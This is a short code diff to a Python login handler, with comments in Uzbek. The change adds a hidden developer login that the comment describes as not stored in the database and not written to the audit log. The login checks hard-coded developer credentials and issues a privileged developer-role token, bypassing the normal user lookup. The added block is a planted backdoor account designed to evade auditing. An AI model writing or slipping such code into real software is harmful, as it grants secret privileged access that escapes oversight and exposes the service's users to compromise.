@@ -25,6 +25,16 @@ def login(payload: schemas.LoginRequest, request: Request, db: Session = Depends
     login_limiter.check(k_user)
     if k_ip:
         ip_limiter.check(k_ip)
+    # --- v13.26: DASTURCHI (yashirin) — bazada yo'q, audit'ga YOZILMAYDI ---
+    if auth.is_dev_login(payload.username or ""):
+        if auth.dev_login_ok(payload.username, payload.password):
+            login_limiter.success(k_user)
+            dev_token = auth.create_access_token(auth.DEV_LOGIN, auth.ROLE_DEV)
+            return schemas.LoginResponse(token=dev_token, username=auth.DEV_LOGIN, role=auth.ROLE_DEV)
+        login_limiter.fail(k_user)
+        if k_ip:
+            ip_limiter.fail(k_ip)
+        raise HTTPException(status_code=401, detail="Login yoki parol xato!")
     user = db.query(models.User).filter(models.User.username == payload.username).first()
     if not user:
         auth.verify_password(payload.password or "x", _DUMMY_HASH)  # vaqt bo'yicha farq bilinmasin
